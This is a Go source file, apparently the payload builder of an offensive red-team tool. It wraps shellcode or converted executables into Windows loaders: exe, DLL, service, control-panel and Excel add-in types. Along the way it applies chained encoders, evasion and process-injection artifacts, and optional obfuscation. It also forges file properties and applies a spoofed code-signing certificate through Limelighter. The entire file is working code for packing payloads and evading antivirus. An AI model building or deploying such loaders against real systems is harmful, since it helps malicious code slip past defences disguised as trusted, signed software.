package builder

import (
	"encoding/hex"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"reflect"
	"strings"
	"text/template"

	"github.com/guervild/uru/data"
	"github.com/guervild/uru/pkg/common"
	"github.com/guervild/uru/pkg/compiler"
	"github.com/guervild/uru/pkg/encoder"
	"github.com/guervild/uru/pkg/evasion"
	"github.com/guervild/uru/pkg/injector"
	"github.com/guervild/uru/pkg/logger"
	"github.com/guervild/uru/pkg/models"
	"github.com/guervild/uru/pkg/tampering"

	"gopkg.in/yaml.v3"
)

type Builder struct {
	Type               string
	Args               string
	ShellcodeData      string
	Imports            []string
	InstancesCode      []string
	FunctionsCode      []string
	DebugInstance      string
	DebugFunction      string
	IsDLL              bool
	IsService          bool
	ExportNames        string
	ServiceName   	   string
	ServiceDisplayName string
	ServiceDescription string
}

type GoMod struct {
	RandomName string
}

type Variables struct {
	Debug bool
}

type PayloadConfig struct {
	Payload Payload `yaml:"payload,omitempty"`
}

type Artifact struct {
	Name string `yaml:"name,omitempty"`
	Type string `yaml:"type,omitempty"`
	Args []Arg  `yaml:"args,omitempty"`
}

type Arg struct {
	Name  string `yaml:"name,omitempty"`
	Value string `yaml:"value,omitempty"`
}

type LimeLighterArgs struct {
	Domain   string `yaml:"domain"`
	Real     string `yaml:"real"`
	Password string `yaml:"password"`
}

type ServiceOptions struct {
	ServiceName   	   string `yaml:"serviceName"`
	ServiceDisplayName string `yaml:"serviceDisplayName"`
	ServiceDescription string `yaml:"serviceDescription"`
}

type Payload struct {
	Arch               string          `yaml:"arch,omitempty"`
	Debug              bool            `yaml:"debug"`
	Type               string          `yaml:"type,omitempty"`
	Sgn                bool            `yaml:"sgn,omitempty"`
	Artifacts          []Artifact      `yaml:"artifacts"`
	Obfuscation        bool            `yaml:"obfuscation"`
	Append             string          `yaml:"append"`
	Prepend            string          `yaml:"prepend"`
	FilePropertiesPath string          `yaml:"file_properties_path"`
	LimeLighterArgs    LimeLighterArgs `yaml:"limelighter"`
	ServiceOptions     ServiceOptions  `yaml:"serviceOptions"`
}

func NewPayloadConfigFromFile(data []byte) (PayloadConfig, error) {

	var p PayloadConfig

	err := yaml.Unmarshal(data, &p)
	if err != nil {
		return p, fmt.Errorf("Error while parsing config file: %v", err)
	}

	return p, nil
}

func (payloadConfig *PayloadConfig) GeneratePayload(filename string, payload []byte, godonut, srdi, keep bool, parameters, functionName, class string, clearHeader bool) (string, []byte, error) {

	//TODO rework createfilefunc
	//define var that will be use later by generate
	currRandom := common.RandomString(4)
	dataTmpl := data.GetTemplates()

	// Instanciate needed array
	var imports []string
	var debugFunction string
	var debugInstance string
	var instancesCode []string
	var functionsCode []string
	var encodersArray []models.ObjectModel
	var encodersStringArray []string
	var alreadyAddedArtifact []string
	var debug bool
	var serviceName string
	var serviceDisplayName string
	var serviceDescription string

	payloadData := payload

	//Process contents
	arch, err := common.GetProperGolangArch(payloadConfig.Payload.Arch)
	if err != nil {
		return "", nil, err
	}

	//Setting extension
	var extension string
	var buildmode string
	isDLL := false
	isService := false

	switch strings.ToLower(payloadConfig.Payload.Type) {
	case "exe":
		extension = "exe"
	case "dll":
		extension = "dll"
		buildmode = "c-shared"
		isDLL = true
	case "svc":
		extension = "exe"
		isService = true
		serviceName = payloadConfig.Payload.ServiceOptions.ServiceName
		serviceDisplayName = payloadConfig.Payload.ServiceOptions.ServiceDisplayName
		serviceDescription = payloadConfig.Payload.ServiceOptions.ServiceDescription
	case "cpl":
		extension = "cpl"
		buildmode = "c-shared"
		isDLL = true
	case "xll":
		extension = "xll"
		buildmode = "c-shared"
		isDLL = true
	case "pie":
		extension = "exe"
		buildmode = "pie"
	default:
		return "", nil, fmt.Errorf("Type must be exe, dll, svc, cpl, xll, or pie.")
	}

	exportNames := common.GetExportNames(extension)

	obfuscated := payloadConfig.Payload.Obfuscation

	if payloadConfig.Payload.Debug {
		logger.Logger.Info().Msg("Debug is set, will add debug functions")
		debug = true
		imports = append(imports, common.GetDebugImports()...)
		debugFunction = common.GetDebugFunction()
		debugInstance = common.GetDebugInstance()
	}

	if godonut == true && srdi == true {
		return "", nil, fmt.Errorf("donut and srdi can't be passed together. Choose only one between the two arguments")
	}

	if godonut {
		logger.Logger.Info().Bool("donut", godonut).Msg("Payload is an executable, will use go-donut...")

		shellcode, err := encoder.ConvertToGoDonutShellcode(payloadData, filepath.Ext(filename), class, functionName, parameters)
		if err != nil {
			return "", nil, err
		}

		payloadData = shellcode
	}

	if srdi {
		logger.Logger.Info().Bool("srdi", srdi).Bool("clearHeader", clearHeader).Str("functionName", functionName).Str("parameters", parameters).Msg("Payload will be converted to srdi shellcode")
		payloadData = encoder.ConvertToSRDIShellcode(payloadData, functionName, parameters, clearHeader)
	}

	//[SGN] - DECOMMENT TO USE SGN
	/*
		if payloadConfig.Payload.Sgn {
			logger.Logger.Info().Msg("Will use SGN on provided payload file")
			logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size before SGN")
			payloadData, err = encoder.DoSGNEncode(payloadConfig.Payload.Arch, payloadData)

			if err != nil {
				return "", nil, fmt.Errorf("Error while SGN encoding", err)
			}

			logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after SGN (bytes)")
		}
	*/

	//Prepend
	if payloadConfig.Payload.Prepend != "" {
		logger.Logger.Info().Msgf("Prepend is set")
		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size before prepend")

		prepend, err := hex.DecodeString(payloadConfig.Payload.Prepend)
		if err != nil {
			return "", nil, fmt.Errorf("Error while decoding prepend string: %s", err.Error())
		}

		tmpPayloadData := make([]byte, 0)

		tmpPayloadData = append(tmpPayloadData, prepend...)
		tmpPayloadData = append(tmpPayloadData, payloadData...)

		payloadData = tmpPayloadData
		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after prepend")
	}

	//Append
	if payloadConfig.Payload.Append != "" {
		logger.Logger.Info().Msgf("Append is set")
		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size before append")
		appendStr, err := hex.DecodeString(payloadConfig.Payload.Append)
		if err != nil {
			return "", nil, fmt.Errorf("Error while decoding append string: %s", err.Error())
		}
		payloadData = append(payloadData, appendStr...)

		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after append")
	}

	for _, v := range payloadConfig.Payload.Artifacts {
		artifactName := strings.ToLower(v.Name)
		artifactType := strings.ToLower(v.Type)

		logger.Logger.Info().Str("name", artifactName).Msg("Process artifact")

		var artifactValue models.ObjectModel

		if artifactType == "encoder" {
			artifactValue, err = encoder.GetEncoder(strings.ToLower(artifactName))
			if err != nil {
				return "", nil, err
			}
			encodersStringArray = append(encodersStringArray, artifactName)
			encodersArray = append(encodersArray, artifactValue)

		} else if artifactType == "evasion" {
			artifactValue, err = evasion.GetEvasion(strings.ToLower(artifactName))
			if err != nil {
				return "", nil, err
			}
		} else if artifactType == "injector" {
			artifactValue, err = injector.GetInjector(strings.ToLower(artifactName))
			if err != nil {
				return "", nil, err
			}
		} else {
			logger.Logger.Info().Str("name", artifactName).Msg("Artifacts not found!")
			continue
		}

		//Use reflect to modify struct on fly
		if len(v.Args) > 0 {
			for _, a := range v.Args {
				if common.HasField(artifactValue, a.Name) {
					logger.Logger.Info().Str("arg_name", a.Name).Str("arg_value", a.Value).Msg("Try to set artifact argument")
					common.SetField(artifactValue, a.Name, a.Value)
					logger.Logger.Info().Str("arg_name", a.Name).Str("arg_value", string(common.GetField(artifactValue, a.Name))).Msg("Value after setting the argument")
				}
			}
		}

		if debug {
			common.SetDebug(artifactValue, "debug", debug)
		}

		if len(artifactValue.GetImports()) > 0 {
			imports = append(imports, artifactValue.GetImports()...)
		}

		iCode, err := artifactValue.RenderInstanciationCode(dataTmpl)
		if err != nil {
			return "", nil, err
		}

		fCode, err := artifactValue.RenderFunctionCode(dataTmpl)
		if err != nil {
			return "", nil, err
		}

		if len(iCode) > 0 {
			instancesCode = append(instancesCode, iCode)
		}

		// If it is already added, we dont to add the function code again
		if len(fCode) > 0 && !common.ContainsStringInSliceIgnoreCase(alreadyAddedArtifact, artifactName) {
			functionsCode = append(functionsCode, fCode)
		}

		alreadyAddedArtifact = append(alreadyAddedArtifact, artifactName)
	}

	//Remove duplicate imports
	logger.Logger.Info().Msg("Removing duplicate imports")
	imports = common.RemoveDuplicateStr(imports)

	//Reverse encoding instance order
	logger.Logger.Info().Msg("Will perform encoding...")
	tmpPayloadData := payloadData
	var tmpPayloadDataout []byte

	for i := len(encodersStringArray) - 1; i >= 0; i-- {

		e := encodersStringArray[i]
		artifactValue := encodersArray[i]

		logger.Logger.Info().Int("size", len(tmpPayloadData)).Msgf("Payload size before %s", e)

		if err != nil {
			return "", nil, err
		}

		methodVal := reflect.ValueOf(artifactValue).MethodByName("Encode")
		if !methodVal.IsValid() {
			logger.Logger.Error().Str("encoder", e).Msg("Could not find 'Encode' method")
			continue
		}

		methodIface := methodVal.Interface()
		method := methodIface.(func(s []byte) ([]byte, error))
		tmpPayloadDataout, err = method(tmpPayloadData)
		if err != nil {
			return "", nil, fmt.Errorf("Error while encoding: %s", err)
		}

		tmpPayloadData = tmpPayloadDataout

		logger.Logger.Info().Int("size", len(tmpPayloadData)).Msgf("Payload size after %s", e)
	}

	payloadData = tmpPayloadData

	logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after encoding")

	tBuilder, err := template.ParseFS(dataTmpl, "templates/core.go.tmpl")
	if err != nil {
		return "", nil, err
	}

	//Build builder struct to pass to the template
	templateData := &Builder{
		ShellcodeData:      common.GetGolangByteArray(payloadData),
		Imports:            imports,
		InstancesCode:      instancesCode,
		FunctionsCode:      functionsCode,
		DebugInstance:      debugInstance,
		DebugFunction:      debugFunction,
		IsDLL:              isDLL,
		IsService:          isService,
		ExportNames:        exportNames,
		ServiceName:        serviceName,
		ServiceDisplayName: serviceDisplayName,
		ServiceDescription: serviceDescription,
	}

	tempFileBase := fmt.Sprintf("out_%s", currRandom)
	dirPath, _ := filepath.Abs(path.Join("out", tempFileBase))

	err = common.CreateDir(dirPath)
	if err != nil {
		return "", nil, err
	}

	logger.Logger.Info().Str("output_directory", dirPath).Msg("Create the output directory")

	file, err := common.CreatePayloadFile("", "", dirPath)
	defer file.Close()

	if err != nil {
		return "", nil, err
	}

	err = tBuilder.Execute(file, templateData)
	if err != nil {
		return "", nil, err
	}
	//Copy go.mod
	fileGoMod, err := common.CreatePayloadFile("go", "mod", dirPath)
	defer fileGoMod.Close()

	if err != nil {
		return "", nil, err
	}

	tGoMod, err := template.ParseFS(dataTmpl, "templates/go.mod.tmpl")
	if err != nil {
		return "", nil, err
	}
	err = tGoMod.Execute(fileGoMod, &GoMod{RandomName: common.RandomStringOnlyChar(8)})
	if err != nil {
		return "", nil, err
	}

	//Copy go.sum
	goSum, _ := dataTmpl.ReadFile("templates/go.sum.tmpl")
	if err := os.WriteFile(path.Join(dirPath, "go.sum"), goSum, 0666); err != nil {
		return "", nil, err
	}

	goFilePath, _ := filepath.Abs(file.Name())

	logger.Logger.Info().Str("path", goFilePath).Msgf("Payload file has been written")

	//FileProperties
	if payloadConfig.Payload.FilePropertiesPath != "" {
		logger.Logger.Info().Msgf("Try to use file properties: %s", payloadConfig.Payload.FilePropertiesPath)

		name, err := tampering.BuildFromJson(payloadConfig.Payload.FilePropertiesPath, arch, dirPath)

		if err != nil {
			logger.Logger.Info().Msgf("Could not use the file properties: %s", err.Error())
			logger.Logger.Info().Msg("Continue ...")
		} else {
			logger.Logger.Info().Msgf("Successfully used file properties with internal name: %s", name)
		}
	}

	// Build phase
	logger.Logger.Info().Str("filename", file.Name()).Msgf("Compiling ...\n")
	//FIXME keep
	goConfig := compiler.NewGoConfig("windows", arch, dirPath, buildmode, true, true, obfuscated, imports)

	goBinFile, _ := filepath.Abs(fmt.Sprintf("%s.%s", common.RemoveExt(file.Name()), extension))

	_, err = goConfig.GoBuild(goFilePath, goBinFile)
	if err != nil {
		return "", nil, err
	}

	/*TODO FIXME keep
	/*
		//If not keep, clean
		if !keep {
			err := os.RemoveAll(dirPath)
			if err != nil {
				return "", nil, err
			}
			//log.Println("Cleaning", dirPath)
		}
	*/

	fileContent, err := os.ReadFile(goBinFile)
	if err != nil {
		return "", nil, err
	}

	logger.Logger.Info().Str("md5", common.GetMD5Hash(fileContent)).Msg("Get MD5 hash of the payload")
	logger.Logger.Info().Str("sha1", common.GetSHA1Hash(fileContent)).Msg("Get SHA1 hash of the payload")
	logger.Logger.Info().Str("sha256", common.GetSHA256Hash(fileContent)).Msg("Get SHA256 hash of the payload")

	//Signing
	if (payloadConfig.Payload.LimeLighterArgs != LimeLighterArgs{}) {
		logger.Logger.Info().Str("file_to_sign", goBinFile).Msg("Using Limelighter by @Tyl0us")
		fSigned, _ := filepath.Abs(fmt.Sprintf("%s_signed.%s", common.RemoveExt(goBinFile), extension))

		errLimeLighter := tampering.Limelighter(goBinFile, fSigned, payloadConfig.Payload.LimeLighterArgs.Domain, payloadConfig.Payload.LimeLighterArgs.Password, payloadConfig.Payload.LimeLighterArgs.Real, "")

		if errLimeLighter != nil {
			logger.Logger.Info().Msgf("Error while using limelighter to sign the payload: %s\n", errLimeLighter)
		} else {
			logger.Logger.Info().Msgf("Signed File Created: %s", fSigned)
			goBinFile = fSigned

			fileContent, err := os.ReadFile(goBinFile)
			if err != nil {
				return "", nil, err
			}

			logger.Logger.Info().Str("md5", common.GetMD5Hash(fileContent)).Msg("Get MD5 hash of the signed payload")
			logger.Logger.Info().Str("sha1", common.GetSHA1Hash(fileContent)).Msg("Get SHA1 hash of the signed payload")
			logger.Logger.Info().Str("sha256", common.GetSHA256Hash(fileContent)).Msg("Get SHA256 hash of the signed payload")
		}
	}

	return goBinFile, nil, nil
}
